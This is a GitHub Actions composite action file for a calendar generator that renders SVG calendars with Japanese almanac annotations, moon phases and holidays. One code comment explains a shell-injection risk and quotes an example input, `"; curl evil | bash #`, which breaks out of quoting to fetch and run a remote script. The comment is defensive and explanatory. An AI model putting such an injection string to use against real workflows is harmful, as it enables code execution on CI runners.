name: "almanac-calendar"
description: "Generate a monthly calendar SVG with Japanese almanac annotations and public holidays"
author: "Hibiki Hata"
branding:
  icon: calendar
  color: purple

inputs:
  out:
    description: "Directory to write calendar-light.svg, calendar-dark.svg and calendar.html into"
    required: false
    default: "dist"
  month:
    description: "Target month as YYYY-MM. Defaults to the current month in `timezone`."
    required: false
  timezone:
    description: >-
      Which zone decides what 'today' is. Runners are on UTC, so leaving this at
      Asia/Tokyo is what keeps the highlight correct between 00:00 and 09:00 JST.
    required: false
    default: "Asia/Tokyo"
  locale:
    description: "ja | en"
    required: false
    default: "ja"
  week_start:
    description: "sunday | monday"
    required: false
    default: "sunday"
  palette:
    description: "default | mono | washi"
    required: false
    default: "default"
  border:
    description: "Draw a 1px card border ('true' to enable)"
    required: false
    default: "false"
  radius:
    description: "Card corner radius in px, 0 for square"
    required: false
    default: "8"
  font:
    description: >-
      Embed a font subset by name (currently only 'noto-sans-jp'). Leave empty to
      rely on the viewer's fonts — on systems without a CJK font that shows tofu.
    required: false
    default: ""
  rokuyo:
    description: "Show rokuyō ('true' to enable)"
    required: false
    default: "false"
  solar_terms:
    description: "Show the 24 solar terms"
    required: false
    default: "false"
  lunar_date:
    description: >-
      Show the lunisolar (Tenpō-reki) date, as `6/20`; a leap month reads `閏6/20`.
      Rokuyō is derived from this, so showing both makes the rokuyō checkable.
    required: false
    default: "false"
  moon:
    description: "Draw the moon phase in each cell"
    required: false
    default: "false"
  moon_age:
    description: "Show the numeric moon age"
    required: false
    default: "false"
  moon_amber:
    description: "Fill the lit face with the palette's moon colour"
    required: false
    default: "false"
  moon_position:
    description: "corner (top-right of the day number) | below (under the annotation line; needs `moon`)"
    required: false
    default: "corner"
  holidays:
    description: "ISO 3166-1 alpha-2 country code (JP, US, KR, ...). Empty disables holidays."
    required: false
    default: ""
  holiday_names:
    description: "Show holiday names (requires `holidays`)"
    required: false
    default: "false"
  lucky_days:
    description: "Show auspicious days (一粒万倍日, 天赦日, ...)"
    required: false
    default: "false"
  unlucky_days:
    description: "Show inauspicious days (不成就日, 三隣亡, ...)"
    required: false
    default: "false"
  annotation_mode:
    description: "priority (top-ranked only) | stack (all applicable, one per line)"
    required: false
    default: "priority"
  colorize:
    description: "Colour 大安 and 仏滅/赤口"
    required: false
    default: "false"

runs:
  # composite, not docker: the render path is standard-library only, so there is
  # nothing to build an image for. Docker would add tens of seconds of pull time
  # per run and put us on the hook for publishing an image.
  using: composite
  steps:
    # A `uses:` inside a published action propagates to every consumer, so the
    # pin matters even more here than in this repository's own workflows.
    - uses: actions/setup-python@5fda3b95a4ea91299a34e894583c3862153e4b97 # v7.0.0
      with:
        python-version: "3.12"
    - name: Generate calendar
      shell: bash
      # **Every input arrives as an environment variable, never as `${{ }}` inside
      # the script.** GitHub substitutes `${{ }}` as raw script text before bash
      # parses anything, so quoting in the YAML does not contain it: an input
      # holding `"; curl evil | bash #` would close the quote and run. This is a
      # reusable action, so the untrusted value would come from whatever the
      # caller wires in — a workflow_dispatch text field, say. Environment
      # variables are expanded by the shell itself and cannot change the script's
      # structure.
      env:
        PYTHONPATH: ${{ github.action_path }}/src
        IN_OUT: ${{ inputs.out }}
        IN_MONTH: ${{ inputs.month }}
        IN_TIMEZONE: ${{ inputs.timezone }}
        IN_LOCALE: ${{ inputs.locale }}
        IN_WEEK_START: ${{ inputs.week_start }}
        IN_PALETTE: ${{ inputs.palette }}
        IN_RADIUS: ${{ inputs.radius }}
        IN_FONT: ${{ inputs.font }}
        IN_BORDER: ${{ inputs.border }}
        IN_ROKUYO: ${{ inputs.rokuyo }}
        IN_SOLAR_TERMS: ${{ inputs.solar_terms }}
        IN_LUNAR_DATE: ${{ inputs.lunar_date }}
        IN_MOON: ${{ inputs.moon }}
        IN_MOON_AGE: ${{ inputs.moon_age }}
        IN_MOON_AMBER: ${{ inputs.moon_amber }}
        IN_MOON_POSITION: ${{ inputs.moon_position }}
        IN_HOLIDAYS: ${{ inputs.holidays }}
        IN_HOLIDAY_NAMES: ${{ inputs.holiday_names }}
        IN_LUCKY_DAYS: ${{ inputs.lucky_days }}
        IN_UNLUCKY_DAYS: ${{ inputs.unlucky_days }}
        IN_ANNOTATION_MODE: ${{ inputs.annotation_mode }}
        IN_COLORIZE: ${{ inputs.colorize }}
      run: |
        set -euo pipefail
        args=(--out "$IN_OUT"
              --timezone "$IN_TIMEZONE"
              --locale "$IN_LOCALE"
              --week-start "$IN_WEEK_START"
              --palette "$IN_PALETTE"
              --radius "$IN_RADIUS"
              --moon-position "$IN_MOON_POSITION"
              --annotation-mode "$IN_ANNOTATION_MODE")
        # `[ ... ] && args+=(...)` is safe under errexit: a command failing inside
        # a && list does not exit the shell unless it follows the final &&.
        [ -n "$IN_MONTH" ]    && args+=(--month "$IN_MONTH")
        [ -n "$IN_FONT" ]     && args+=(--font "$IN_FONT")
        [ -n "$IN_HOLIDAYS" ] && args+=(--holidays "$IN_HOLIDAYS")
        [ "$IN_BORDER" = "true" ]        && args+=(--border)
        [ "$IN_ROKUYO" = "true" ]        && args+=(--rokuyo)
        [ "$IN_SOLAR_TERMS" = "true" ]   && args+=(--solar-terms)
        [ "$IN_LUNAR_DATE" = "true" ]    && args+=(--lunar-date)
        [ "$IN_MOON" = "true" ]          && args+=(--moon)
        [ "$IN_MOON_AGE" = "true" ]      && args+=(--moon-age)
        [ "$IN_MOON_AMBER" = "true" ]    && args+=(--moon-amber)
        [ "$IN_HOLIDAY_NAMES" = "true" ] && args+=(--holiday-names)
        [ "$IN_LUCKY_DAYS" = "true" ]    && args+=(--lucky-days)
        [ "$IN_UNLUCKY_DAYS" = "true" ]  && args+=(--unlucky-days)
        [ "$IN_COLORIZE" = "true" ]      && args+=(--colorize)
        python3 -m almanac_calendar "${args[@]}"
